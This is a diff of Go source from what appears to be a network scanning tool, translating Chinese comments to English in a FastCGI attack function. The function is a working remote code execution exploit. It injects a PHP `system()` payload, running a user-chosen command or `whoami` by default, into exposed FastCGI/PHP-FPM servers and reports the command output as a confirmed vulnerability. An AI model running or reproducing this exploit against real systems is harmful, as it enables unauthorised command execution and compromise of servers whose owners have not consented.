@@ -18,34 +18,34 @@ import (
 //https://xz.aliyun.com/t/9544
 //https://github.com/wofeiwo/webcgi-exploits
 
-// FcgiScan 执行FastCGI服务器漏洞扫描
+// FcgiScan performs a FastCGI server vulnerability scan
 func FcgiScan(info *Common.HostInfo) error {
-	// 如果设置了暴力破解模式则跳过
+	// Skip if brute force mode is set
 	if Common.DisableBrute {
 		return nil
 	}
 
-	// 设置目标URL路径
+	// Set target URL path
 	url := "/etc/issue"
 	if Common.RemotePath != "" {
 		url = Common.RemotePath
 	}
 	addr := fmt.Sprintf("%v:%v", info.Host, info.Ports)
 
-	// 构造PHP命令注入代码
+	// Construct PHP command injection code
 	var reqParams string
-	var cutLine = "-----ASDGTasdkk361363s-----\n" // 用于分割命令输出的标记
+	var cutLine = "-----ASDGTasdkk361363s-----\n" // Marker for separating command output
 
 	switch {
 	case Common.Command == "read":
-		reqParams = "" // 读取模式
+		reqParams = "" // Read mode
 	case Common.Command != "":
-		reqParams = fmt.Sprintf("<?php system('%s');die('%s');?>", Common.Command, cutLine) // 自定义命令
+		reqParams = fmt.Sprintf("<?php system('%s');die('%s');?>", Common.Command, cutLine) // Custom command
 	default:
-		reqParams = fmt.Sprintf("<?php system('whoami');die('%s');?>", cutLine) // 默认执行whoami
+		reqParams = fmt.Sprintf("<?php system('whoami');die('%s');?>", cutLine) // Default to whoami
 	}
 
-	// 设置FastCGI环境变量
+	// Set FastCGI environment variables
 	env := map[string]string{
 		"SCRIPT_FILENAME": url,
 		"DOCUMENT_ROOT":   "/",
@@ -54,7 +54,7 @@ func FcgiScan(info *Common.HostInfo) error {
 		"SERVER_PROTOCOL": "HTTP/1.1",
 	}
 
-	// 根据请求类型设置对应的环境变量
+	// Set corresponding environment variables based on request type
 	if len(reqParams) != 0 {
 		env["CONTENT_LENGTH"] = strconv.Itoa(len(reqParams))
 		env["REQUEST_METHOD"] = "POST"
@@ -63,7 +63,7 @@ func FcgiScan(info *Common.HostInfo) error {
 		env["REQUEST_METHOD"] = "GET"
 	}
 
-	// 建立FastCGI连接
+	// Establish FastCGI connection
 	fcgi, err := New(addr, Common.Timeout)
 	defer func() {
 		if fcgi.rwc != nil {
@@ -71,41 +71,41 @@ func FcgiScan(info *Common.HostInfo) error {
 		}
 	}()
 	if err != nil {
-		fmt.Printf("FastCGI连接失败 %v:%v - %v\n", info.Host, info.Ports, err)
+		fmt.Printf("FastCGI connection failed %v:%v - %v\n", info.Host, info.Ports, err)
 		return err
 	}
 
-	// 发送FastCGI请求
+	// Send FastCGI request
 	stdout, stderr, err := fcgi.Request(env, reqParams)
 	if err != nil {
-		fmt.Printf("FastCGI请求失败 %v:%v - %v\n", info.Host, info.Ports, err)
+		fmt.Printf("FastCGI request failed %v:%v - %v\n", info.Host, info.Ports, err)
 		return err
 	}
 
-	// 处理响应结果
+	// Process response result
 	output := string(stdout)
 	var result string
 
 	if strings.Contains(output, cutLine) {
-		// 命令执行成功，提取输出结果
+		// Command executed successfully, extract output result
 		output = strings.SplitN(output, cutLine, 2)[0]
 		if len(stderr) > 0 {
-			result = fmt.Sprintf("FastCGI漏洞确认 %v:%v\n命令输出:\n%v\n错误信息:\n%v\n建议尝试其他路径，例如: -path /www/wwwroot/index.php",
+			result = fmt.Sprintf("FastCGI vulnerability confirmed %v:%v\nCommand output:\n%v\nError message:\n%v\nSuggest trying other paths, e.g., -path /www/wwwroot/index.php",
 				info.Host, info.Ports, output, string(stderr))
 		} else {
-			result = fmt.Sprintf("FastCGI漏洞确认 %v:%v\n命令输出:\n%v",
+			result = fmt.Sprintf("FastCGI vulnerability confirmed %v:%v\nCommand output:\n%v",
 				info.Host, info.Ports, output)
 		}
 		Common.LogSuccess(result)
 	} else if strings.Contains(output, "File not found") ||
 		strings.Contains(output, "Content-type") ||
 		strings.Contains(output, "Status") {
-		// 目标存在FastCGI服务但可能路径错误
+		// Target has FastCGI service but possibly incorrect path
 		if len(stderr) > 0 {
-			result = fmt.Sprintf("FastCGI服务确认 %v:%v\n响应:\n%v\n错误信息:\n%v\n建议尝试其他路径，例如: -path /www/wwwroot/index.php",
+			result = fmt.Sprintf("FastCGI service confirmed %v:%v\nResponse:\n%v\nError message:\n%v\nSuggest trying other paths, e.g., -path /www/wwwroot/index.php",
 				info.Host, info.Ports, output, string(stderr))
 		} else {
-			result = fmt.Sprintf("FastCGI服务确认 %v:%v\n响应:\n%v",
+			result = fmt.Sprintf("FastCGI service confirmed %v:%v\nResponse:\n%v",
 				info.Host, info.Ports, output)
 		}
 		Common.LogSuccess(result)
